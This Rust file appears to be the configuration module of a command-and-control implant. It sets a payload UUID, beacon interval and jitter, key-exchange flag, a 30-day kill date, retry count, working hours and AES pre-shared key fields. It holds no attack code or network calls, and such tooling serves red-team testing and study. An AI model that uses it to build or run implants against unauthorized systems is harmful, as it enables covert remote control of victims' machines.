use chrono::{Duration, Local, NaiveTime};
use serde::{Deserialize, Serialize};
use uuid::Uuid;

/// Structure to hold the http header information
#[derive(Deserialize, Serialize)]
struct Header {
    /// Name for the header
    name: String,

    /// Key of the header json
    key: String,

    /// Value for the header
    value: String,

    /// If this is a custom header
    custom: bool,
}

/// Structure to hold static AES key information
#[derive(Deserialize, Serialize)]
struct Aespsk {
    /// If the PSK is AES or none
    value: String,

    /// Encryption key if it exists
    enc_key: Option<String>,

    /// Decryption key if it exists (should be the same as `enc_key`)
    dec_key: Option<String>,
}

/// Helper function to get the payload UUID
pub fn payload_uuid() -> String {
    // let uuid = Uuid::new_v4();
    let uuid = "c21e4cc4-171b-4491-b784-507d9dde7abf"; // !!! Need change to Valid UUID
    uuid.to_string()
}

/// Helper function to get the configured callback interval
pub fn callback_interval() -> u64 {
    10
}

/// Helper function to get the configured callback jitter
pub fn callback_jitter() -> u64 {
    23
}

/// Helper function to check if the agent should perform a key exchanged
pub fn encrypted_exchange_check() -> String {
    "F".to_string()
}

/// Helper function to get the kill date for the agent
pub fn killdate() -> String {
    let local = Local::now().naive_local();
    (local + Duration::days(30)).format("%Y-%m-%d").to_string()
}

/// Helper function to get the number of checkin retries
pub fn retries() -> u32 {
    10
}

/// Helper function to get the working hours start time
pub fn working_start() -> NaiveTime {
    let starttime = "00:00-23:59".split('-').next().unwrap();
    NaiveTime::parse_from_str(starttime, "%H:%M").unwrap()
}

/// Helper function to get the working hours end time
pub fn working_end() -> NaiveTime {
    let endtime = "00:00-23:59".split('-').last().unwrap();
    NaiveTime::parse_from_str(endtime, "%H:%M").unwrap()
}
